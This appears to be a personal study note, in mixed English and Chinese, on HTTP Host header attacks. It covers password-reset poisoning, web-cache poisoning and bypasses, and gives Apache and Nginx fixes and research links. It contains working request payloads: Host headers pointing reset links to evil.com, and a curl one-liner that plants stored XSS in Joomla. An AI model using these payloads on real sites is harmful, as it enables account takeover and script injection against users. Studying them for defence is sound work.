## HTTP Host header attacks




### 1.1 Password reset and web-cache poisoning

The second technique abuses alternative channels like password reset emails where the poisoned content is delivered directly to the target

The vulnerability was that url::abs_site used the Host header provided by the person requesting the reset, so an attacker could trigger password reset emails poisoned with a hijacked link by tampering with their Host header:

	> POST /password/reset HTTP/1.1
	> Host: evil.com
	> ...
	> csrf=1e8d5c9bceb16667b1b330cc5fd48663&name=admin


如图


In other cases, the Host may be URL-decoded and placed directly into the email header allowing mail header injection. Using this, attackers can easily hijack accounts by BCCing password reset emails to themselves

### 1.2 web-cache poisoning


manipulating caching systems into storing a page generated with a malicious Host and serving it to others.

The objective of web cache poisoning is to send a request that causes a harmful response that gets saved in the cache and served to other users.


to persuade a cache to serve our poisoned response to someone else we need to create a disconnect between the host header the cache sees, and the host header the application sees.

In the case of the popular caching solution Varnish, this can be achieved using duplicate Host headers. Varnish uses the first host header it sees to identify the request, but Apache concatenates all host headers present and Nginx uses the last host header[1]. This means that you can poison a Varnish cache with URLs pointing at evil.com by making the following request:

	> GET / HTTP/1.1
	> Host: example.com
	> Host: evil.com

Joomla writes the Host header to every page without HTML-encoding it, and its cache is entirely oblivious to the Host header. Gaining persistent XSS on the homepage of a Joomla installation was as easy as:

	curl -H "Host: cow\"onerror='alert(1)'rel='stylesheet'" http://example.com/ | fgrep cow\"

This will create the following request:
	
	> GET / HTTP/1.1
	> Host: cow"onerror='alert(1)'rel='stylesheet'

The response should show a poisoned <link> element:

	<link href="http://cow"onerror='alert(1)'rel='stylesheet'/" rel="canonical"/>




**cache poisoning tags:**

X-Forwarded-Host        eg:      X-Forwarded-Host: evil.com

Host   					eg：	     Host: addons.mozilla.org:@passwordreset.net


X-Forwarded-Port        eg:

	GET /index.php?dontpoisoneveryone=1 HTTP/1.1
	Host: www.hackerone.com
	X-Forwarded-Port: 123
	
	HTTP/1.1 302 Found
	Location: https://www.hackerone.com:123/

X-Forwarded-SSL

Transfer-Encoding

Range: bytes=cow

Accept, Upgrade, Origin, Max-Forwards ......


<br/>

<br/>

This is simple to exploit using the ever-useful http://username:password@domain.com syntax:

Host: 域名:@域名2

一种绕过手段

会跳转第二个

识别机制就是这样的，匹配到@就会跳转后面的域名   跟服务器无关  任何域名都这样

patch: 使用黑名单来过滤@和其他一些字符

bypass: 由于密码重置电子邮件以纯文本而不是HTML格式发送，因此空格会将URL分为两个单独的链接：

	> POST /en-US/firefox/users/pwreset HTTP/1.1
	> Host: addons.mozilla.org: www.securepasswordreset.com

patch: Host标头中的端口规范只能包含数字，从而完全防止了基于端口的攻击

bypass: [the arguably ultimate authority on virtual hosting, RFC2616](https://www.ietf.org/rfc/rfc2616.txt)

	5.2 The Resource Identified by a Request
	[...]
	If Request-URI is an absoluteURI, the host is part of the Request-URI. Any Host header field value in the request MUST be ignored.

payload:

	> POST https://addons.mozilla.org/en-US/firefox/users/pwreset HTTP/1.1
	> Host: evil.com

This request results in a SERVER_NAME of addons.mozilla.org but a HTTP['HOST'] of evil.com. Applications that use SERVER_NAME rather than HTTP['HOST'] are unaffected by this particular trick, but can still be exploited on common server configurations. 

如果未ServerName指定，则服务器尝试通过对IP地址执行反向查找来推断主机名。如果没有在中指定端口ServerName，则服务器将使用传入请求中的端口。为了获得最佳的可靠性和可预测性，您应该使用ServerName指令指定一个明确的主机名和端口。

patch:  by enforcing a whitelist of allowed hosts

You need to set UseCanonicalName directive to on in the <VirtualHost> entry of the ServerName in httpd.conf 

	<VirtualHost *>
	    ServerName example.com
	    UseCanonicalName on
	</VirtualHost> 

可以通过在Apache（指令）和Nginx（指令）下创建一个虚拟虚拟主机来实现，该虚拟虚拟主机可以捕获带有无法识别的主机标头的所有请求。也可以在Nginx下通过指定非通配符SERVER_NAME来完成，而在Apache下通过使用非通配符serverName并打开  UseCanonicalName  指令来完成。我建议尽可能使用两种方法。


Further research

* More effective / less inconvenient fixes
* Automated detection
* Exploiting wildcard whitelists with XSS & window.history
* Exploiting multipart password reset emails by predicting boundaries
* Better cache fuzzing (trailing Host headers?)




## 参考资料

[Practical HTTP Host header attacks](https://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html)

[Responsible denial of service with web cache poisoning](https://portswigger.net/research/responsible-denial-of-service-with-web-cache-poisoning)

https://nathandavison.com/blog/corsing-a-denial-of-service-via-cache-poisoning

https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn

https://portswigger.net/research/practical-web-cache-poisoning


挑战 https://hackxor.net/mission?id=8

https://portswigger.net/research/bypassing-web-cache-poisoning-countermeasures

https://www.youtube.com/watch?v=j2RrmNxJZ5c

+ ids rules 3条




## Web Cache Deception Attack

是一种与缓存投毒不同的攻击方式

https://omergil.blogspot.com/2017/02/web-cache-deception-attack.html